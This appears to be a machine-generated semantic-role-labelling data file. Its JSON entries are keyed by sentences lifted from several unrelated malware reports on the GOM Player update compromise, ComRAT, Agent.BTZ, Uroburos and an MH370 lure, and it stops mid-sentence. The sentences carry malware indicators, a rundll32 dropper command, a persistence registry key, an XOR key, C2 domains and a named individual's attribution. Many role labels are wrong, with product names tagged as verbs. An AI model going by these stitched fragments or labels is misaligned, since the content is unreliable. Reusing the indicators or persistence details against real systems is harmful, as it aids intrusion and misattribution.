"ARG1": {"text": "server"}}}, " This is a practice recently\nillustrated through the deployment of the PlugX trojan, utilising DLL load order hijacking\nalongside a signed (trusted) executable": {"is": {"ARG1": {"text": "This"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "a practice recently illustrated through the deployment of the PlugX trojan , utilising DLL load order hijacking alongside a signed ( trusted ) executable"}}, "illustrated": {"ARG1": {"text": "a practice"}, "ARGM-TMP": {"text": "recently"}, "V": {"text": "illustrated", "index": 5}, "ARGM-MNR": {"text": "through the deployment of the PlugX trojan , utilising DLL load order hijacking alongside a signed ( trusted ) executable"}}, "utilising": {"V": {"text": "utilising", "index": 14}, "ARG1": {"text": "DLL load order"}}, "hijacking": {"ARG0": {"text": "utilising DLL load order"}, "V": {"text": "hijacking", "index": 18}, "ARGM-LOC": {"text": "alongside a signed ( trusted ) executable"}}, "signed": {"V": {"text": "signed", "index": 21}}}, "\n\nThe attack appears to have been the result of the attackers having compromised the\n\u2018GOM Player\u2019 update server and having it act as a \u2018watering hole\u2019, meaning that\nmachines which access the site are delivered malware": {"appears": {"ARG1": {"text": "The attack"}, "V": {"text": "appears", "index": 2}, "C-ARG1": {"text": "to have been the result of the attackers having compromised the \u2018 GOM Player \u2019 update server and having it act as a \u2018 watering hole \u2019 , meaning that machines which access the site are delivered malware"}}, "have": {"V": {"text": "have", "index": 4}}, "been": {"ARG1": {"text": "The attack"}, "V": {"text": "been", "index": 5}, "ARG2": {"text": "the result of the attackers having compromised the \u2018 GOM Player \u2019 update server and having it act as a \u2018 watering hole \u2019"}}, "having": {"V": {"text": "having", "index": 11}}, "compromised": {"ARG0": {"text": "the attackers"}, "V": {"text": "compromised", "index": 12}, "ARGM-MNR": {"text": "the \u2018 GOM Player \u2019 update server"}}, "having_2": {"ARG0": {"text": "the attackers"}, "V": {"text": "having", "index": 21}, "ARG1": {"text": "it act as a \u2018 watering hole \u2019"}}, "act": {"ARG0": {"text": "it"}, "V": {"text": "act", "index": 23}, "ARG1": {"text": "as a \u2018 watering hole \u2019"}}, "meaning": {"V": {"text": "meaning", "index": 31}, "ARG1": {"text": "that machines which access the site are delivered malware"}}, "access": {"ARG0": {"text": "machines"}, "R-ARG0": {"text": "which"}, "V": {"text": "access", "index": 35}, "ARG1": {"text": "the site"}}, "are": {"V": {"text": "are", "index": 38}}, "delivered": {"ARG1": {"text": "which access the site"}, "V": {"text": "delivered", "index": 39}, "ARGM-PRD": {"text": "malware"}}}, "\n<figure>\n                                                Repackaged Update\n           GoMPLAYERJPSETUP.EXE (a9225e059d9dace1b259bceec7f48dae)\n\n\n\n\n                                       Real GOM Player Installer        Self-extracting RAR Archive containing Malware\n    GOMPLAYERJPSETUP_JP.EXE (1ff3b3628e40f0215afacf482ba17782)          GOMPLAYERBETASETUP_JP.exe (db79a93448acac8786581858f3edc36a)\n\n\n\n\n                                           Obfuscated Malware Loaders\n                                                                               Malicious Installer\n                          dll.tmp (d5548e1913950a42a04debcac4222bd2)\n                                                                               install.exe (0ae82fd94836815a1e8d284ccb75109d)\n                       dll64.tmp (01f7b465242237bd3d31d39767aa68e0)\n\n                                                                         Obfuscated Implant Code\n                                                                         instructions.pdf (569071c45f47b7fb7a75f30bc07d5739)\n                                                                         instructions64.pdf (55474f8e26f2b6fc3b5d78ce9a77b0b0)\n\n\n                                          The deployment chain of the Miancha Gh0st variant\n\n\n</figure>\n<footnote>\n3   http://www.symantec.com/security_response/writeup.jsp?docid=2014-012407-3922-99\n\n</footnote>                                         \n                                         <footer>   TLP: WHITE                                        Page 6 / 11</footer>\n\f                     <header>TLP: WHITE</header>\n\n\n\n\nThe main implant code is stored in files named instructions.pdf and instructions64.pdf;\nnot PDF documents but instead DLLs obfuscated with a one-byte XOR with 0x14, similar\nto the malware loader DLLs": {"is": {"V": {"text": "is", "index": 4}}, "stored": {"ARG1": {"text": "The main implant code"}, "V": {"text": "stored", "index": 5}, "ARGM-LOC": {"text": "in files named instructions.pdf and instructions64.pdf ; not PDF documents"}}, "named": {"V": {"text": "named", "index": 8}, "ARG2": {"text": "instructions.pdf and instructions64.pdf"}}, "PDF": {"ARGM-NEG": {"text": "not"}, "V": {"text": "PDF", "index": 14}, "ARG1": {"text": "documents"}}, "DLLs": {"ARGM-ADV": {"text": "instead"}, "V": {"text": "DLLs", "index": 18}, "ARG1": {"text": "obfuscated with a one - byte XOR"}, "ARGM-MNR": {"text": "with 0x14 ,"}, "ARGM-PRD": {"text": "similar to the malware loader DLLs"}}, "obfuscated": {"ARG1": {"text": "DLLs"}, "V": {"text": "obfuscated", "index": 19}, "ARG2": {"text": "with a one - byte XOR with 0x14 ,"}, "C-ARG2": {"text": "similar to the malware loader DLLs"}}}, "\n\nThe modified file redirected the GOM Player update process to another compromised\nserver (www.fudousankaitori.jp (203.189.101.35)), where a file containing both the\nlegitimate update and the malware was deliver to the victim": {"modified": {"V": {"text": "modified", "index": 1}, "ARG1": {"text": "file redirected"}}, "redirected": {"ARG0": {"text": "The modified file"}, "V": {"text": "redirected", "index": 3}, "ARG1": {"text": "the GOM Player update process"}, "ARG2": {"text": "to another compromised server ( www.fudousankaitori.jp ( 203.189.101.35 ) ) , where a file containing both the legitimate update and the malware was deliver to the victim"}}, "compromised": {"V": {"text": "compromised", "index": 11}, "ARG1": {"text": "server"}}, "containing": {"ARG0": {"text": "a file"}, "V": {"text": "containing", "index": 23}, "ARG1": {"text": "both the legitimate update"}}, "was": {"V": {"text": "was", "index": 31}}, "deliver": {"ARG1": {"text": "the malware"}, "V": {"text": "deliver", "index": 32}, "ARG2": {"text": "to the victim"}}}, "\n\n\n<figure>\n\n                                                                      Modified\n                                                                     Update URL\n                                                                                                      app.gomlab.com\n                                                        GOM Player\n                                                       Upd ate Requ est\n\n\n                               1\n                                                GOM Update\n\n                                     2        Download Request\n\n\n                                                                                  GOM Player and\n                                                                                    Malware\n\n          Victim                          3                                                        www.fudousankaitori.jp\n\n\n                                                              Malware Command\n                                                                 And Control\n       Key\n\n\n               Compromised Server\n\n\n               Attacker Infrastructure                                                                 testqweasd.tk\n\n\n</figure>\n<caption>\n     A diagram illustrating the modified flow of the GOM Player update process which led to the compromise\n</caption>\n\n\n<footnote>\n2   http://hummingbird.tistory.com/5187\n</footnote>\n</section>\n                                         <footer>   TLP: WHITE                                        Page 5 / 11</footer>\n\f                     <header>TLP: WHITE</header>\n\n\n\n<section>\n<heading>3.2 Malware</heading>\n</section>\n<section>\n<heading>3.2.1 Overview</heading>\n\nDeployed to the system via a compressed bundle containing the official GOM Player\nsetup binary and a self-extracting RAR archive containing the malicious files, the\nmalware consists of a number of individual pieces": {"Deployed": {"V": {"text": "Deployed", "index": 0}, "ARG2": {"text": "to the system"}, "ARGM-MNR": {"text": "via a compressed bundle containing the official GOM Player setup binary and a self - extracting RAR archive containing the malicious files"}, "ARG1": {"text": "the malware"}}, "compressed": {"V": {"text": "compressed", "index": 6}, "ARG1": {"text": "bundle"}}, "containing": {"ARG0": {"text": "a compressed bundle"}, "V": {"text": "containing", "index": 8}, "ARG1": {"text": "the official GOM Player setup binary"}}, "extracting": {"ARGM-MNR": {"text": "self"}, "V": {"text": "extracting", "index": 19}, "ARG0": {"text": "RAR"}}, "containing_2": {"ARG0": {"text": "a self - extracting RAR"}, "ARGM-MNR": {"text": "archive"}, "V": {"text": "containing", "index": 22}, "ARG1": {"text": "the malicious files"}}, "consists": {"R-ARG1": {"text": "Deployed to the system via a compressed bundle containing the official GOM Player setup binary and a self - extracting RAR archive containing the malicious files"}, "ARG1": {"text": "the malware"}, "V": {"text": "consists", "index": 29}, "ARG2": {"text": "of a number of individual pieces"}}}, "\n\nIn addition to delivering system-specific details back to the attacker, Gh0st RAT provides\nthe capability to deploy additional malware, enabling the harvesting of sensitive data\nand enabling the further propagation throughout the infected network": {"delivering": {"V": {"text": "delivering", "index": 3}, "ARG1": {"text": "system - specific details"}, "ARG2": {"text": "back to the attacker"}, "ARG0": {"text": "Gh0st"}}, "provides": {"ARGM-ADV": {"text": "In addition to delivering system - specific details back to the attacker"}, "ARG0": {"text": "Gh0st RAT"}, "V": {"text": "provides", "index": 15}, "ARG1": {"text": "the capability to deploy additional malware , enabling the harvesting of sensitive data and enabling the further propagation throughout the infected network"}}, "deploy": {"V": {"text": "deploy", "index": 19}, "ARG1": {"text": "additional malware"}}, "enabling": {"V": {"text": "enabling", "index": 23}, "ARG2": {"text": "the harvesting of sensitive data"}}, "enabling_2": {"V": {"text": "enabling", "index": 30}, "ARG2": {"text": "the further propagation"}, "ARGM-LOC": {"text": "throughout the infected network"}}}, " Upon extraction from the RAR\narchive, the installer component (0ae82fd94836815a1e8d284ccb75109d) is\nautomatically launched alongside the GOM Player update, distracting victims from the\nmalicious activity taking place": {"is": {"V": {"text": "is", "index": 13}}, "launched": {"ARGM-TMP": {"text": "Upon extraction from the RAR archive"}, "ARG1": {"text": "the installer component ( 0ae82fd94836815a1e8d284ccb75109d )"}, "ARGM-MNR": {"text": "automatically"}, "V": {"text": "launched", "index": 15}, "ARGM-LOC": {"text": "alongside the GOM Player update/ activity taking place"}, "ARGM-PRD": {"text": "distracting victims from the malicious"}}, "distracting": {"ARG0": {"text": "the installer component ( 0ae82fd94836815a1e8d284ccb75109d )"}, "V": {"text": "distracting", "index": 22}, "ARG1": {"text": "victims"}, "ARG2": {"text": "from the malicious activity taking place"}}, "taking": {"ARG1": {"text": "the malicious activity"}, "V": {"text": "taking", "index": 28}, "ARG2": {"text": "place"}}}, "\n\nThe observed malicious activity relates to the modification of a file that controls GOM\nPlayer updates, spanning the date range 27th December 2013 to 16th January 2014,\nduring which time these alterations are reported to have only manifested themselves for\nvisitors on certain IP ranges; evidence supporting this claim has not yet been made\npublic": {"relates": {"ARG1": {"text": "The observed malicious activity"}, "V": {"text": "relates", "index": 4}, "ARG2": {"text": "to the modification of a file that controls GOM Player updates , spanning the date range 27th December 2013 to 16th January 2014 , during which time these alterations are reported to have only manifested themselves for visitors on certain IP ranges"}}, "controls": {"ARG0": {"text": "a file"}, "R-ARG0": {"text": "that"}, "V": {"text": "controls", "index": 12}, "ARG1": {"text": "GOM Player updates"}}, "spanning": {"ARG0": {"text": "a file"}, "R-ARG0": {"text": "that"}, "V": {"text": "spanning", "index": 17}, "ARG1": {"text": "the date range 27th December"}}, "are": {"V": {"text": "are", "index": 34}}, "reported": {"ARGM-TMP": {"text": "during which time"}, "V": {"text": "reported", "index": 35}, "ARG1": {"text": "to have only manifested themselves for visitors on certain IP ranges"}}, "have": {"V": {"text": "have", "index": 37}}, "manifested": {"ARG0": {"text": "these alterations"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "manifested", "index": 39}, "ARG1": {"text": "themselves"}, "ARG2": {"text": "for visitors on certain IP ranges"}}, "ranges": {"ARG1": {"text": "certain IP"}, "V": {"text": "ranges", "index": 46}}, "supporting": {"ARG0": {"text": "evidence"}, "V": {"text": "supporting", "index": 49}, "ARG1": {"text": "this claim"}}, "has": {"V": {"text": "has", "index": 52}}, "been": {"V": {"text": "been", "index": 55}}, "made": {"ARGM-NEG": {"text": "not"}, "ARGM-TMP": {"text": "yet"}, "V": {"text": "made", "index": 56}, "ARG1": {"text": "public"}}}, "\n\nTechnical analysis of the implant on the compromised machine has shown it to be a\nvariant of a Trojan which has been in the wild for some years now and continues to be\neffective": {"compromised": {"V": {"text": "compromised", "index": 7}, "ARG1": {"text": "machine"}}, "has": {"V": {"text": "has", "index": 9}}, "shown": {"ARG0": {"text": "Technical analysis of the implant on the compromised machine"}, "V": {"text": "shown", "index": 10}, "ARG1": {"text": "to be a variant of a Trojan which has been in the wild for some years now and continues to be effective"}}, "be": {"V": {"text": "be", "index": 13}, "ARG2": {"text": "a variant of a Trojan which has been in the wild for some years now and continues to be effective"}}, "has_2": {"V": {"text": "has", "index": 20}}, "been": {"ARG1": {"text": "a Trojan"}, "R-ARG1": {"text": "which"}, "V": {"text": "been", "index": 21}, "ARG2": {"text": "in the wild"}, "ARGM-TMP": {"text": "for some years now"}}, "continues": {"V": {"text": "continues", "index": 30}, "ARG1": {"text": "to be effective"}}, "be_2": {"ARG1": {"text": "which"}, "V": {"text": "be", "index": 32}, "ARG2": {"text": "effective"}}}, "\n      Agent.BTZ is a common RAT, a simple library executed on an infected machine": {"is": {"ARGM-DIS": {"text": "Agent"}, "ARG1": {"text": "BTZ"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "a common RAT , a simple library executed on an infected machine"}}, "executed": {"ARG1": {"text": "a simple library"}, "V": {"text": "executed", "index": 11}, "ARGM-LOC": {"text": "on an infected machine"}}}, " The\ncommunication between the processes is performed by named pipe": {"is": {"V": {"text": "is", "index": 5}}, "performed": {"ARG1": {"text": "The communication between the processes"}, "V": {"text": "performed", "index": 6}, "ARG0": {"text": "by named pipe"}}, "named": {"V": {"text": "named", "index": 8}, "ARG2": {"text": "pipe"}}}, "\n</section>\n<section>\n<heading>Execution flow and features</heading>\n\nDuring the startup of the infected machine, the shdocvw.tlp library is loaded into all processes": {"infected": {"V": {"text": "infected", "index": 5}, "ARG1": {"text": "machine"}}, "is": {"V": {"text": "is", "index": 11}}, "loaded": {"ARGM-TMP": {"text": "During the startup of the infected machine"}, "ARG2": {"text": "the shdocvw.tlp library"}, "V": {"text": "loaded", "index": 12}, "ARG1": {"text": "into all processes"}}}, " The malware is loaded into each and every process of the infected machine and the main part\n      (payload) of the malware is only executed in explorer.exe": {"is": {"V": {"text": "is", "index": 2}}, "loaded": {"ARG2": {"text": "The malware"}, "V": {"text": "loaded", "index": 3}, "ARG1": {"text": "into each and every process of the infected machine"}}, "infected": {"V": {"text": "infected", "index": 11}, "ARG1": {"text": "machine"}}, "is_2": {"V": {"text": "is", "index": 23}}, "executed": {"ARG1": {"text": "the main part ( payload ) of the malware"}, "ARGM-ADV": {"text": "only"}, "V": {"text": "executed", "index": 25}, "ARGM-LOC": {"text": "in explorer.exe"}}}, " The dropper executes the following command in order to install a second file:\n<list>\nrundll32.exe %APPDATA%\\Microsoft\\credprov.tlb,Install %APPDATA%\\Microsoft\\shdocvw.tlp\n</list>\nThe second file is shdocw.tlp": {"executes": {"ARG0": {"text": "The dropper"}, "V": {"text": "executes", "index": 2}, "ARG1": {"text": "the following command"}, "ARGM-PRP": {"text": "in order to install a second file"}}, "following": {"V": {"text": "following", "index": 4}, "ARG1": {"text": "command"}}, "install": {"V": {"text": "install", "index": 9}, "ARG1": {"text": "a second file"}}, "is": {"ARG1": {"text": "The second file"}, "V": {"text": "is", "index": 17}, "ARG2": {"text": "shdocw.tlp"}}}, " Furthermore, the attackers also shared a C&C domain": {"shared": {"ARGM-DIS": {"text": "Furthermore"}, "ARG0": {"text": "the attackers"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "shared", "index": 5}, "ARG1": {"text": "a C&C domain"}}}, "\n</list>\n\fComRAT\u2019s communication to the command and control server is performed by the browser process and not by\nexplorer.exe in order to avoid being blocked by a firewall on the system or any additional security products": {"ComRAT": {"V": {"text": "ComRAT", "index": 0}, "ARG1": {"text": "\u2019s communication"}, "ARG2": {"text": "to the command and control server"}}, "is": {"V": {"text": "is", "index": 9}}, "performed": {"ARG1": {"text": "ComRAT \u2019s communication to the command and control server"}, "V": {"text": "performed", "index": 10}, "ARG0": {"text": "by the browser process and not by explorer.exe"}, "ARGM-PRP": {"text": "in order to avoid being blocked by a firewall on the system or any additional security products"}}, "avoid": {"V": {"text": "avoid", "index": 22}, "ARG1": {"text": "being blocked by a firewall on the system or any additional security products"}}, "being": {"V": {"text": "being", "index": 23}}, "blocked": {"V": {"text": "blocked", "index": 24}, "ARG0": {"text": "by a firewall on the system or any additional security products"}}}, " The command and control server information is\nstored in the registry, not in an XML, and encoded:\n<list>\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SessionMRU\\IPlace\n</list>\nFor example, in the analyzed sample the CC is: weather-online.hopto.org": {"is": {"V": {"text": "is", "index": 6}}, "stored": {"ARG1": {"text": "The command and control server information"}, "V": {"text": "stored", "index": 7}, "ARGM-LOC": {"text": "in the registry , not in an XML , and encoded"}}, "encoded": {"ARG1": {"text": "The command and control server information/ weather-online.hopto.org"}, "V": {"text": "encoded", "index": 18}, "ARGM-ADV": {"text": "For example , in the analyzed sample the CC is"}}, "is_2": {"ARGM-DIS": {"text": "For example"}, "ARGM-LOC": {"text": "in the analyzed sample"}, "ARG1": {"text": "the CC"}, "V": {"text": "is", "index": 29}, "ARG2": {"text": "weather-online.hopto.org"}}}, " The purpose is to load the library into each and every process\nexecuted on the infected system": {"is": {"ARG1": {"text": "The purpose"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "to load the library into each and every process executed on the infected system"}}, "load": {"V": {"text": "load", "index": 4}, "ARG2": {"text": "the library"}, "ARG1": {"text": "into each"}}, "executed": {"ARG0": {"text": "every process"}, "V": {"text": "executed", "index": 12}, "ARG1": {"text": "on the infected system"}}}, "\n      Command and control server domains are shared between Uroburos and ComRAT": {"Command": {"V": {"text": "Command", "index": 0}, "ARG2": {"text": "server domains"}}, "are": {"V": {"text": "are", "index": 5}}, "shared": {"ARG1": {"text": "Command and control server domains"}, "V": {"text": "shared", "index": 6}, "C-ARG1": {"text": "between Uroburos and ComRAT"}}, "ComRAT": {"ARG1": {"text": "Command and control server domains"}, "V": {"text": "ComRAT", "index": 10}}}, "\n\nAnother very interesting fact: the attackers use COM Object hijacking, the same persistence mechanism as\nCOMpfun, which we described recently": {"use": {"ARG0": {"text": "the attackers"}, "V": {"text": "use", "index": 7}, "ARG1": {"text": "COM Object hijacking , the same persistence mechanism as COMpfun , which we described recently"}}, "described": {"ARG1": {"text": "COMpfun"}, "R-ARG1": {"text": "which"}, "ARG0": {"text": "we"}, "V": {"text": "described", "index": 21}, "ARGM-TMP": {"text": "recently"}}}, " The file is xored with the\nfollowing obfuscation key (used by both, Uroburos and Agent.BTZ):\n<list>\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6gs923HL34x2f5cvd0fk6c1a0s\n</list>\nHere is the decoded log file content:\n<list>\nuser1@gdata$ ./decode.py winview.ocx\nLog begin: 06.11.2014 22:55:55\nTVer=2.2\n06.11.2014 22:55:55 TVer=2.3\n06.11.2014 22:55:55 CFG: CFG_4\n06.11.2014 22:55:55 User: user1\n06.11.2014 22:55:55 Machine: x86\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\shdocvw.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\oleaut32.dll [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\oleaut32.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\credprov.tlb [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\libadcodec.dll [2]\n06.11.2014 22:55:55 Removing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\libadcodec.tlb [2]\n06.11.2014 22:55:55 Writing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\shdocvw.tlb 51200B\nOk\n06.11.2014 22:55:56 Writing C:\\Documents and Settings\\user1\\Application Data\\\\Microsoft\\\\credprov.tlb\n260096B Ok\n06.11.2014 22:55:57 Exit code1 0\n06.11.2014 22:55:57 Writing 3072B Ok\n</list>\nWe can notice that the malware checks if an older version is installed on the system and if this is the case, the\ndropper removes the older version": {"is": {"ARG1": {"text": "The file"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "xored with the following obfuscation key ( used by both"}}, "xored": {"ARG1": {"text": "The file"}, "V": {"text": "xored", "index": 3}, "ARGM-MNR": {"text": "with the following obfuscation key ( used by both"}}, "following": {"V": {"text": "following", "index": 6}}, "used": {"ARG1": {"text": "the"}, "V": {"text": "used", "index": 10}, "ARG0": {"text": "by both , Uroburos"}}, "can": {"ARG0": {"text": "We"}, "V": {"text": "can", "index": 22}, "ARG1": {"text": "notice that the malware checks if an older version is installed on the system and if this is the case"}}, "notice": {"ARG0": {"text": "We"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "notice", "index": 23}, "ARG1": {"text": "that the malware checks if an older version is installed on the system and if this is the case , the dropper removes the older version"}}, "is_2": {"V": {"text": "is", "index": 32}}, "installed": {"ARG1": {"text": "an older version"}, "V": {"text": "installed", "index": 33}, "ARG2": {"text": "on the system"}}, "is_3": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 40}, "ARG2": {"text": "the case"}}, "removes": {"ARGM-ADV": {"text": "if this is the case"}, "ARG0": {"text": "the dropper"}, "V": {"text": "removes", "index": 46}, "ARG1": {"text": "the older version"}}}, " In contrast to this, in our Uroburos analysis, we found out that Uroburos does\nnot install itself in case a version of Agent.BTZ was found on a system": {"found": {"ARGM-ADV": {"text": "In contrast to this"}, "ARGM-LOC": {"text": "in our Uroburos analysis"}, "ARG0": {"text": "we"}, "V": {"text": "found", "index": 11}, "ARG1": {"text": "that Uroburos does not install itself in case a version of Agent . BTZ was found on a system"}}, "does": {"V": {"text": "does", "index": 15}}, "install": {"ARG0": {"text": "Uroburos"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "install", "index": 17}, "ARG1": {"text": "itself"}, "ARGM-PRP": {"text": "in case a version of Agent"}}, "was": {"V": {"text": "was", "index": 27}}, "found_2": {"ARG1": {"text": "BTZ"}, "V": {"text": "found", "index": 28}, "ARGM-LOC": {"text": "on a system"}}}, " Furthermore, the C&C communication blends into\n      the usual browser traffic and the malware communicates to the browser by named pipe": {"blends": {"ARGM-DIS": {"text": "Furthermore"}, "ARG1": {"text": "the C&C communication"}, "V": {"text": "blends", "index": 5}, "ARG2": {"text": "into the usual browser traffic and the malware communicates to the browser by named pipe"}}, "named": {"V": {"text": "named", "index": 19}, "ARG2": {"text": "pipe"}}}, " The\nlatest version of ComRAT known to us (v3.26) uses a new key and does not create the installation log file, in order to\ncomplicate the analysis and to disguise the link between the two cases": {"known": {"ARG1": {"text": "ComRAT"}, "V": {"text": "known", "index": 5}, "ARG2": {"text": "to us ( v3.26 )"}}, "uses": {"ARG0": {"text": "The latest version of ComRAT known to us ( v3.26 )"}, "V": {"text": "uses", "index": 11}, "ARG1": {"text": "a new key"}, "ARGM-PRP": {"text": "in order to complicate/ analysis and to disguise the link between the two cases"}}, "does": {"V": {"text": "does", "index": 16}}, "create": {"ARG0": {"text": "The latest version of ComRAT known to us ( v3.26 )"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "create", "index": 18}, "ARG1": {"text": "the installation log file"}, "ARGM-PRP": {"text": "in order to complicate the analysis and to disguise the link between the two cases"}}, "complicate": {"V": {"text": "complicate", "index": 27}, "ARG1": {"text": "the analysis"}}, "disguise": {"V": {"text": "disguise", "index": 32}, "ARG1": {"text": "the link between the two cases"}}}, " If the process is\nexplorer.exe, this library will load the other library called credprov.tlb": {"is": {"ARG1": {"text": "the process"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "explorer.exe"}}, "will": {"ARGM-ADV": {"text": "If the process is explorer.exe"}, "ARG0": {"text": "this library"}, "V": {"text": "will", "index": 8}, "ARG1": {"text": "load the other library called credprov.tlb"}}, "load": {"ARGM-ADV": {"text": "If the process is explorer.exe"}, "ARG0": {"text": "this library"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "load", "index": 9}, "ARG2": {"text": "the other library called credprov.tlb"}}, "called": {"ARG1": {"text": "the other library"}, "V": {"text": "called", "index": 13}, "ARG2": {"text": "credprov.tlb"}}}, "\n</section>\n<section>\n<heading>Persistence</heading>\n\nTo be started during the boot process of the infected machine, the malware creates the following registry key:\n<list>\nHKCU\\Software\\Classes\\CLSID\\{42aedc87-2188-41fd-b9a3-0c966feabec1}\\InprocServer32 =\n%APPDATA%\\shdocvw.tlp\n</list>\nThis registry key is used to associate the library shdocvw.tlp to the object 42aedc87-2188-41fd-b9a3-0c966feabec1\nas previously explained in the article about COMpfun": {"is": {"V": {"text": "is", "index": 3}}, "used": {"ARG1": {"text": "This registry key"}, "V": {"text": "used", "index": 4}, "ARG2": {"text": "to associate the library shdocvw.tlp to the object 42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1 as previously explained in the article about COMpfun"}}, "associate": {"ARG0": {"text": "This registry key"}, "V": {"text": "associate", "index": 6}, "ARG1": {"text": "the library shdocvw.tlp"}, "ARG2": {"text": "to the object 42aedc87 - 2188 - 41fd - b9a3 - 0c966feabec1 as previously explained in the article about COMpfun"}}, "explained": {"ARGM-TMP": {"text": "previously"}, "V": {"text": "explained", "index": 24}, "ARGM-LOC": {"text": "in the article"}, "C-ARG1": {"text": "about COMpfun"}}}, "\n</section>\n<section>\n<heading>Log files</heading>\n\nTwo log files are created during the malware execution: mskfp32.ocx and msvcrtd.tlb": {"are": {"V": {"text": "are", "index": 3}}, "created": {"ARG1": {"text": "Two log files"}, "V": {"text": "created", "index": 4}, "ARGM-TMP": {"text": "during the malware execution : mskfp32.ocx and msvcrtd.tlb"}}}, "\nIf the malware version in lower than 3.26, the XML log file contains the command and control server information:\n<list>\n\f[\u2026]\n<add ke=\"IsAdmin\" value=\"1\" />\n<add key=\"Http address\" value=\"webonline.mefound.com\" />\n<add key=\"Http address\" value=\"sportacademy.my03.com\" />\n<add key=\"Http address2\" value=\"easport-news.publicvm.com\" />\n<add key=\"Http address2\" value=\"new-book.linkpc.net\" />\n<add key=\"Http idx1\" value=\"4294967295\" />\n[\u2026]\n</list>\n</section>\n<section>\n<heading>Summary</heading>\n\nLet us summarize the similarities and differences between Agent.BTZ, Uroburos and ComRAT as far as we can:\n<list>\nSimilarities:\nBefore version 3.26:\n\n      use of the same xor key\n      use of the same file name for the log\n\n\n\nOn all versions:\n</list>\n      Some parts of the code are exactly the same (appears to be copy & paste)": {"contains": {"ARGM-ADV": {"text": "If the malware version in lower than 3.26"}, "ARG0": {"text": "the XML log file"}, "V": {"text": "contains", "index": 13}, "ARG1": {"text": "the command and control server information"}}, "are": {"ARG1": {"text": "Some parts of the code"}, "V": {"text": "are", "index": 26}, "ARGM-ADV": {"text": "exactly"}, "ARG2": {"text": "the same ("}}, "appears": {"V": {"text": "appears", "index": 31}, "C-ARG1": {"text": "to be copy & paste )"}}, "be": {"V": {"text": "be", "index": 33}, "ARG2": {"text": "copy & paste )"}}}, " We suspect that\nthis date is spoofed in order to disguise that this is in fact a newer version": {"suspect": {"ARG0": {"text": "We"}, "V": {"text": "suspect", "index": 1}, "ARG1": {"text": "that this date is spoofed in order to disguise that this is in fact a newer version"}}, "is": {"V": {"text": "is", "index": 5}}, "spoofed": {"ARG1": {"text": "this date"}, "V": {"text": "spoofed", "index": 6}, "ARGM-PRP": {"text": "in order to disguise that this is in fact a newer version"}}, "disguise": {"V": {"text": "disguise", "index": 10}, "ARG1": {"text": "that this is in fact a newer version"}}, "is_2": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 13}, "ARGM-ADV": {"text": "in fact"}, "ARG2": {"text": "a newer version"}}}, "\n</section>\n<section>\n\f<heading>Dropper\u2019s log file</heading>\n\nIf the version of the malware is older than 3.26, the dropper creates an additional file called winview.ocx": {"is": {"ARG1": {"text": "the version of the malware"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "older than 3.26"}}, "creates": {"ARGM-ADV": {"text": "If the version of the malware is older than 3.26"}, "ARG0": {"text": "the dropper"}, "V": {"text": "creates", "index": 13}, "ARG1": {"text": "an additional file called winview.ocx"}}, "called": {"ARG1": {"text": "an additional file"}, "V": {"text": "called", "index": 17}, "ARG2": {"text": "winview.ocx"}}}, "\n</section>\n<section>\n<heading>File installation</heading>\n\nThe first task of the malware is to install the file credprov.tlb in %APPDATA%\\Microsoft\\": {"is": {"ARG1": {"text": "The first task of the malware"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "to install the file credprov.tlb in % APPDATA%\\Microsoft\\"}}, "install": {"V": {"text": "install", "index": 8}, "ARG1": {"text": "the file credprov.tlb in % APPDATA%\\Microsoft\\"}}}, " Though many of the samples that we have observed use direct IPs for HTTP communications, we have\nobserved more limited use of a No-IP domain": {"have": {"V": {"text": "have", "index": 7}}, "observed": {"ARG1": {"text": "the samples/ use direct IPs for HTTP communications"}, "R-ARG1": {"text": "that"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 8}}, "have_2": {"V": {"text": "have", "index": 17}}, "observed_2": {"ARGM-ADV": {"text": "Though many of the samples that we have observed use direct IPs for HTTP communications"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 18}, "ARG1": {"text": "more limited use of a No - IP domain"}}}, " Interestingly, this SFXRAR's filename was the only lure element related to the MH370 event; it did not contain a decoy document": {"was": {"ARGM-ADV": {"text": "Interestingly"}, "ARG1": {"text": "this SFXRAR 's filename"}, "V": {"text": "was", "index": 6}, "ARG2": {"text": "the only lure element related to the MH370 event"}}, "related": {"ARGM-PRD": {"text": "only lure"}, "V": {"text": "related", "index": 11}, "ARG2": {"text": "to the MH370 event"}}, "did": {"V": {"text": "did", "index": 18}}, "contain": {"ARG0": {"text": "it"}, "ARGM-NEG": {"text": "not"}, "V": {"text": "contain", "index": 20}, "ARG1": {"text": "a decoy document"}}}, " The debug path of \"umairaziz27\" led us to Twitter<fn>42</fn> and LinkedIn<fn>43</fn> accounts (on which a matching alias is used) that belong to a Tranchulas employee named Umair Aziz, who identified himself as an Information Security Analyst<fn>44</fn> and graduate of National University of Sciences and Technology<fn>45</fn> (NUST).<fn>46</fn> One of these samples was probably used in attacks in late summer 2013, using a \"leaked report\" 